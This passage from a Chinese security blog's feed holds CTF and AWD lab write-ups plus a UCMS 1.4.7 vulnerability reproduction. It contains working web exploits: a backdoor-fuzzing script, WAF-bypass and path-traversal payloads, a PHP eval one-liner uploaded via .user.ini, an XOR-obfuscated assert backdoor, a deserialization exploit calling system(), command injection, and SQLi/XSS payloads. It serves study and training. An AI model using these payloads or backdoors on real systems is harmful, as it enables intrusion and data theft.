class="string">"\$_POST\[[\'\"](.*?)[\'\"]\]"</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">file_list = os.listdir(<span class="string">"/Applications/MAMP/htdocs/src"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/Applications/MAMP/htdocs/src/"</span>+file, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().decode()</span><br><span class="line">    f.close()</span><br><span class="line">    get_param = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> get_preg.findall(content):</span><br><span class="line">        get_param.append(each+<span class="string">"=whoami"</span>)</span><br><span class="line">    get_all = <span class="string">"&amp;"</span>.join(get_param)</span><br><span class="line">    post_param = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> post_preg.findall(content):</span><br><span class="line">        post_param.update(&#123;each:<span class="string">"whoami"</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> each_get <span class="keyword">in</span> get_param:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = session.post(url=<span class="string">"http://localhost:8888/src/"</span>+file+<span class="string">"?"</span>+get_all,data=post_param)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"a2u13"</span> <span class="keyword">in</span> c.text:</span><br><span class="line">                print(<span class="string">"已找到："</span>+file)</span><br><span class="line">                print(<span class="string">"GET参数:&#123;&#125;,POST参数:&#123;&#125;"</span>.format(get_all,post_param))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            c.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">thread = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> file_list:</span><br><span class="line">    thread.append(threading.Thread(target=get_backdoor,args=(each,)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">    each.start()</span><br></pre></td></tr></table></figure><p>这个得看电脑性能，一次性起几千个线程电脑配置跟不上就会这样</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212001027.png" alt=""></p><p><strong>普通版本：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">get_preg = re.compile(<span class="string">"\$_GET\[[\'\"](.*?)[\"\']\]"</span>)</span><br><span class="line">post_preg = re.compile(<span class="string">"\$_POST\[[\'\"](.*?)[\'\"]\]"</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">file_list = os.listdir(<span class="string">"/Applications/MAMP/htdocs/src"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/Applications/MAMP/htdocs/src/"</span>+file, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().decode()</span><br><span class="line">    f.close()</span><br><span class="line">    get_param = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> get_preg.findall(content):</span><br><span class="line">        get_param.append(each+<span class="string">"=whoami"</span>)</span><br><span class="line">    get_all = <span class="string">"&amp;"</span>.join(get_param)</span><br><span class="line">    post_param = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> post_preg.findall(content):</span><br><span class="line">        post_param.update(&#123;each:<span class="string">"whoami"</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = session.post(url=<span class="string">"http://localhost:8888/src/"</span>+file+<span class="string">"?"</span>+get_all,data=post_param)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"a2u13"</span> <span class="keyword">in</span> c.text:</span><br><span class="line">            print(<span class="string">"已找到："</span>+file)</span><br><span class="line">            </span><br><span class="line">            print(<span class="string">"GET参数:&#123;&#125;,POST参数:&#123;&#125;"</span>.format(get_all,post_param))</span><br><span class="line">        c.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> file_list:</span><br><span class="line">    get_backdoor(each)</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212001359.png" alt=""></p><p>找到后把所有的<code>whoami</code>替换为<code>cat /flag</code>即可</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">z5c_TrB</span>=cat /flag&amp;<span class="attribute">xd0UXc39w</span>=cat /flag&amp;<span class="attribute">xd0UXc39w</span>=cat /flag&amp;<span class="attribute">DdWk_nXmZTF_Dt</span>=cat /flag&amp;<span class="attribute">dthxTqRPg8YtH</span>=cat /flag&amp;<span class="attribute">ImPVuGCXfrS</span>=cat /flag&amp;<span class="attribute">O0yRgyjaOF7m</span>=cat /flag&amp;<span class="attribute">DeMcscsp</span>=cat /flag&amp;<span class="attribute">YV8nqJDhD</span>=cat /flag&amp;<span class="attribute">EMNPxS2A7</span>=cat /flag&amp;<span class="attribute">kBVLzQEgb</span>=cat /flag&amp;<span class="attribute">kBVLzQEgb</span>=cat /flag&amp;<span class="attribute">Efa5BVG</span>=cat /flag&amp;<span class="attribute">i_QfWB2x1</span>=cat /flag&amp;<span class="attribute">i_QfWB2x1</span>=cat /flag&amp;<span class="attribute">E8NPXbr7Cq</span>=cat /flag&amp;<span class="attribute">zfEddFlxaK_FTO3A</span>=cat /flag&amp;<span class="attribute">qjWSY5fjcgNtb</span>=cat /flag&amp;<span class="attribute">qUVRuZTF27EhUKTI</span>=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212001705.png" alt=""></p><p>这里试了一下<code>GET</code>就出来了，就没必要再弄<code>POST</code>了</p><p><strong>其实用普通版本也挺快的，我这里一分半就出结果了，多线程那个会出一堆问题，所以还是不建议用</strong></p><p><strong>而且这里面应该是<code>eval(system($_GET))</code>，如果是<code>eval($_GET)</code>的话，跑完再加个<code>system</code>即可，反正用不了多少时间，这道题就这样吧~</strong></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212142910.png" alt=""></p><p>很熟悉的界面，和当时国赛的西南赛区计算器题看起来差不多</p><p>结果是在<code>calc.php</code>文件中计算，打开可以看到<code>calc.php</code>的源码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212143129.png" alt=""></p><p>这道题才发现以前做过，我记得原理是<code>HTTP走私攻击</code>，这里就不在做题的时候研究了这个了，到时候专门学习一下</p><p>可以看到他过滤了很多东西，比如<code>$、\、^、[、]</code>等等东西，导致没法异或或者自增等方式来构造命令</p><p>而且这玩意有<code>WAF</code>，输入敏感命令就会 403，所以这里先得绕过去<code>WAF</code></p><p>这里官方解法是<code>HTTP走私攻击</code>,但在我做题的时候，发现在<code>num</code>之前加一个<code>+</code>即可绕过`WAF</p><p>具体原理<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212153151.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212150426.png" alt=""></p><p>这里就绕过了限制，读到了<code>phpinfo()</code>，接下来要读<code>flag</code></p><p>这里可以使用<code>PHP</code>的函数<code>file_get_contents</code>来获取文件内容</p><p>使用<code>scan_dir</code>来读取目录文件</p><p>使用<code>hex2bin(dechex(ASCII码))</code>的方式来绕过字符限制</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212150630.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212150651.png" alt=""></p><p>这样就可以实现</p><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="type">ASCII</span>-&gt;<span class="type">Dec</span>-&gt;<span class="type">Hex</span>-&gt;<span class="built_in">char</span></span><br></pre></td></tr></table></figure><p>这里附上转换脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">strr = <span class="string">"../../../../../../../../"</span></span><br><span class="line">ls = []</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"."</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> strr:</span><br><span class="line">ls.append(<span class="string">"hex2bin(dechex(&#123;&#125;))"</span>.format(ord(each)))</span><br><span class="line"></span><br><span class="line">print(payload.join(ls))</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/calc.php?+num=var_dump(scandir(hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">46</span>)).hex2bin(dechex(<span class="number">47</span>))))</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212150854.png" alt=""></p><p>这里直接使用<code>scandir</code>会返回一个<code>Array</code>，得依靠<code>var_dump</code>来弄出数组的所有元素</p><p>可以看到<code>flag</code>在<code>f1agg</code>文件中</p><p>然后直接<code>file_get_contents</code>函数读取<code>flag</code>即可，也可以使用<code>readfile</code>函数</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/calc.php?+num=file<span class="constructor">_get_contents(<span class="params">hex2bin</span>(<span class="params">dechex</span>(47)</span>).f1agg)</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212151515.png" alt=""></p><p>走私攻击会专门写一篇文章来实践一下原理和应用方式</p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>这道题同样做过，记得用的是一种很偏门的上传方式<code>.user.ini</code></p><p>具体细节如下：</p><p><a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">.user.ini文件构成的PHP后门 – phith0n</a></p><p><a href="https://segmentfault.com/a/1190000011552335" target="_blank" rel="noopener">神秘的.user.ini文件</a></p><p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">官方.user.ini文档</a></p><p>不过这个文件的应用场景需要在<strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别，只要是以<code>fastcgi</code>运行的<code>PHP</code>都可以用这个方法</p><p>这道题做过，所以知道得上传<code>GIF</code>文件，正常的话得一个个<code>FUZZ</code></p><p>先上传<code>gif</code>图片文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212155103.png" alt=""></p><p>直接写一句话会被检测到<code>&lt;?</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_GET[<span class="string">'a2u13'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212155323.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212155304.png" alt=""></p><p>看到成功上传</p><p>然后上传<code>.user.ini</code>文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212155811.png" alt=""></p><p>这里Mac不知道怎么上传.系统文件，直接直接用<code>BurpSuite</code>改一下包传上去</p><p>然后访问上传目录下，这里一般肯定会有一个<code>PHP</code>文件存在，让这个文件来加载那个<code>a2u13.gif</code>中的一句话，否则是没法利用的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212160205.png" alt=""></p><p>然后直接<code>getflag</code></p><p><strong>这道题的主要坑爹点在于好多人不知道有<code>.user.ini</code>这个文件存在，其他的不难，很常规的考点</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[HCTF 2018]WarmUp&lt;/li&gt;
&lt;li&gt;[强网杯 2019]随便注&lt;/li&gt;
&lt;li&gt;[护网杯 2018]easy_tornado&lt;/li&gt;
&lt;li&gt;[SUCTF 2019]EasySQL&lt;/li&gt;
&lt;li&gt;[HCTF 2018]admin&lt;/li&gt;
&lt;li&gt;[强网杯 2019]高明的黑客&lt;/li&gt;
&lt;li&gt;[RoarCTF 2019]Easy Calc&lt;/li&gt;
&lt;li&gt;[SUCTF 2019]CheckIn&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>UCMS v1.4.7后台漏洞总结</title>
    <link href="https://a2u13.com/2020/02/10/UCMS-v1-4-7%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://a2u13.com/2020/02/10/UCMS-v1-4-7%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-02-10T09:01:55.000Z</published>
    <updated>2020-06-07T06:28:29.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>在学校背网络安全技术背的头昏脑涨，就去<code>CNVD</code>逛了逛，看到<code>UCMS</code>的几个漏洞，正好有些背不下去了，把<code>UCMS</code>的几个漏洞给复现一下，总体感觉不难，比审计大型框架简单了许多，整体流程不复杂。</p><p>这里把以前的文章整理了一下重新放到新博客上面，这里时间可能不太对，但问题不大Hhhh</p><p><strong>后台文件管理Webshell直接上传漏洞</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163250.png" alt=""></p><p><strong>后台SQL注入漏洞</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163317.png" alt=""></p><p><strong>后台XSS漏洞(几个)</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163515.png" alt=""></p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="后台文件上传漏洞"><a href="#后台文件上传漏洞" class="headerlink" title="后台文件上传漏洞"></a>后台文件上传漏洞</h2><p>第一个直接打开文件管理界面</p><p>进入<code>uploadfile</code>文件夹中，直接上传我们的写的<code>shell.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163644.png" alt=""></p><p>直接执行命令就可以</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163658.png" alt=""></p><h2 id="后台SQL注入漏洞"><a href="#后台SQL注入漏洞" class="headerlink" title="后台SQL注入漏洞"></a>后台SQL注入漏洞</h2><p>在<code>/ucms/sadmin/ceditpost.php</code>中</p><p>第124行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cvalue=$_POST[<span class="string">'cvalue'</span>];</span><br></pre></td></tr></table></figure><p>而在129行中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ifbindstr = $GLOBALS[<span class="string">'db'</span>] -&gt; fetchcount(<span class="string">"SELECT count(id) FROM "</span>.tableex(<span class="string">'str'</span>).<span class="string">" where strcid='$cid' and ifbind='1'"</span>);</span><br><span class="line"><span class="keyword">if</span>($ifbindstr&lt;<span class="number">1</span>) &#123;</span><br><span class="line">  $query = $GLOBALS[<span class="string">'db'</span>] -&gt; query(<span class="string">"INSERT INTO `"</span>.tableex(<span class="string">'str'</span>).<span class="string">"`(`strname`,`strcid`,`strorder`,`inputkind`,`strvalue`,`ifbind`) VALUES('$cname','$cid','1','1','','1');"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = $GLOBALS[<span class="string">'db'</span>] -&gt; query(<span class="string">"UPDATE `"</span>.tableex(<span class="string">'str'</span>).<span class="string">"` SET strvalue='$cvalue' WHERE strcid='$cid' and ifbind='1'"</span>);</span><br></pre></td></tr></table></figure><p>这里可以看到对<code>$cvalue</code>没有进行任何过滤就被引用，那么可以用来做<code>SQL注入</code></p><p>这里进入<code>/ucms_1.4.7/ucms/index.php?do=sadmin</code>界面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163716.png" alt=""></p><p>选择新建栏目保存</p><p>然后点击栏目配置</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163726.png" alt=""></p><p>根据网页响应时长，可以看到网页的确被延迟了10秒显示，<code>SQL注入</code>漏洞存在</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163740.png" alt=""></p><h2 id="后台XSS漏洞（一）"><a href="#后台XSS漏洞（一）" class="headerlink" title="后台XSS漏洞（一）"></a>后台XSS漏洞（一）</h2><p>问题出在<code>sadmin/filedit.php</code>文件中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210164713.png" alt=""></p><p>很明显，对<code>dir</code>参数没有进行任何过滤，直接打<code>XSS</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163810.png" alt=""></p><p>payload:</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">ucms/index.php?do=sadmin_fileedit<span class="variable">&amp;dir</span>=<span class="params">&lt;script&gt;</span>alert(<span class="number">1</span>)<span class="params">&lt;/script&gt;</span><span class="variable">&amp;file</span>=<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><h2 id="后台XSS漏洞（二）"><a href="#后台XSS漏洞（二）" class="headerlink" title="后台XSS漏洞（二）"></a>后台XSS漏洞（二）</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163827.png" alt=""></p><p>这里在过滤前进行了输出，可以打出<code>XSS</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163856.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163910.png" alt=""></p><p>只要是有这个栏目的地方都会触发xss</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163922.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总而言之除了任意文件上传那个漏洞以外，其他几个漏洞都挺鸡肋的，都进后台了，还需要打<code>XSS</code>和<code>SQL注入</code>?</p><p>除非他能开放任意注册功能和后台编辑权利，要不然的话对管理员的影响力很小</p><p>不过对于审计的思路来说，还是学到了挺多东西：</p><ul><li>要注意变量是否在过滤之前被页面输出</li><li>SQL注入要关心每一个拼接的变量，如果没有被预编译处理的话，很有可能存在未被过滤的漏网之鱼</li><li>多注意后台文件处理部分模块，黑白盒来观察流程</li></ul><h1 id="源码和审计小工具"><a href="#源码和审计小工具" class="headerlink" title="源码和审计小工具"></a>源码和审计小工具</h1><p><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/ucms_1.4.7.zip" target="_blank" rel="noopener">UCMS1.4.7</a></p><p><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7%E5%99%A8.zip" target="_blank" rel="noopener">文件监控器</a>贼好用的审计工具，可以监视代码执行过程中的文件修改、删除、创建操作，简化版的<code>Debug</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;p&gt;在学校背网络安全技术背的头昏脑涨，就去&lt;code&gt;CNVD&lt;/code&gt;逛了逛，看到&lt;code&gt;UCMS&lt;/code&gt;的几个漏洞，正好有些背不下去了，把&lt;code&gt;UCMS&lt;/code&gt;的几个漏洞给复现一下，总体感觉不难，比审计大型框架简单了许多，整体流程不复杂。&lt;/p&gt;
&lt;p&gt;这里把以前的文章整理了一下重新放到新博客上面，这里时间可能不太对，但问题不大Hhhh&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后台文件管理Webshell直接上传漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163250.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后台SQL注入漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163317.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后台XSS漏洞(几个)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210163515.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://a2u13.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://a2u13.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>星盟20200210AWD训练赛复盘</title>
    <link href="https://a2u13.com/2020/02/10/%E6%98%9F%E7%9B%9F20200210AWD%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <id>https://a2u13.com/2020/02/10/%E6%98%9F%E7%9B%9F20200210AWD%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
    <published>2020-02-10T06:04:24.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200209232947.png" alt=""></p><p>在<code>admin/func.php</code>内存在函数<code>shell</code>，存在<code>exec</code>代码执行，这里由于是前面存在<code>ping</code>，我们这里直接闭合执行命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1;cat /flag</span><br></pre></td></tr></table></figure><a id="more"></a><p>由于是函数形式，得找到调用点，发现在<code>/admin/index.php</code>中存在调用</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200209233231.png" alt=""></p><p>得满足<code>isset($_GET[&#39;shell&#39;]</code>的条件</p><p>因此最终构造payload为：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/admin/index.php?shell=<span class="number">1</span>&amp;<span class="keyword">out</span>=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;cat /flag</span><br></pre></td></tr></table></figure><p>即可<code>getflag</code></p><h3 id="修补方式"><a href="#修补方式" class="headerlink" title="修补方式"></a>修补方式</h3><p>直接删掉函数或者注释引用点即可</p><h2 id="assert预留后门（存在问题）"><a href="#assert预留后门（存在问题）" class="headerlink" title="assert预留后门（存在问题）"></a>assert预留后门（存在问题）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"1:"</span>.$_;</span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"2:"</span>.$__;</span><br><span class="line">$___=$$__;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"3:"</span>.$___;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>但这个后门实际运行结果为：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210132834.png" alt=""></p><p>异或结果有问题导致利用不了</p><p>但实际上比赛一开始就能扫到这种预留后门，大家都会删掉会修改，利用价值不大</p><h3 id="修补方式-1"><a href="#修补方式-1" class="headerlink" title="修补方式"></a>修补方式</h3><p>删掉即可</p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h2 id="反序列化命令执行"><a href="#反序列化命令执行" class="headerlink" title="反序列化命令执行"></a>反序列化命令执行</h2><p>在<code>login/logout.php</code>中存在一个反序列化触发点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210133026.png" alt=""></p><p>很简单的反序列化点，直接贴EXP：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $name = <span class="string">"system"</span>;</span><br><span class="line"><span class="keyword">public</span> $male = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$a = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">$a(<span class="keyword">$this</span>-&gt;male);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"></span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure><p>修改<code>$male</code>即可执行任意命令</p><p>运行结果为：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:1</span><span class="selector-pseudo">:"A"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"system"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"male"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"cat /flag"</span>;&#125;</span><br></pre></td></tr></table></figure><p>执行格式：</p><p>GET:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/login/logout.php?<span class="attribute">x</span>=1</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">un=<span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"system"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"male"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"cat /flag"</span>;&#125;</span><br></pre></td></tr></table></figure><p>即可<code>getflag</code>，或者修改<code>$male</code>实现执行任意命令</p><h3 id="修补方式-2"><a href="#修补方式-2" class="headerlink" title="修补方式"></a>修补方式</h3><p>注释反序列化点即可</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>在<code>grade.php</code>文件中存在一处任意文件读取</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210133448.png" alt=""></p><p>很简单，直接贴EXP了</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">grade.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span 